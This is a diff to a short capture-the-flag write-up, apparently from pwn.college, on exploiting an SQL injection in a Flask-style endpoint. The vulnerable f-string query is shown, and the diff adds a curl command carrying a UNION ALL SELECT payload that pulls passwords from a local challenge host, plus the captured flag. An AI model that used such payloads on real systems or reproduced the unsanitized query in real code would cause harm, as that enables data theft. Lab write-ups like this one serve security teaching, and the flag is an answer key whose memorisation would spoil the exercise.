@@ -4,7 +4,7 @@ We are given with a task of `Exploit a structured query language injection vulne
 
 As usual we got the machine access and source code access.
 
-```python
+```python {8} /{query}/ copy
 
 def level5():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
@@ -15,4 +15,14 @@ def level5():
     users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
     return "".join(f'{user["username"]}\n' for user in users)
 
+```
+We can see that the query is not sanitized and we can use the `UNION` operator to get the flag.
+
+```bash
+curl -s -X GET 'http://challenge.localhost/?query=flag" UNION ALL SELECT password FROM users --'
+```
+it will retrives the flag
+
+```bash copy
+pwn.college{IvXTaIYF_kFjcQlW7YfGlT_cgMz.dFTOzMDL0IzMyMzW}
 ```
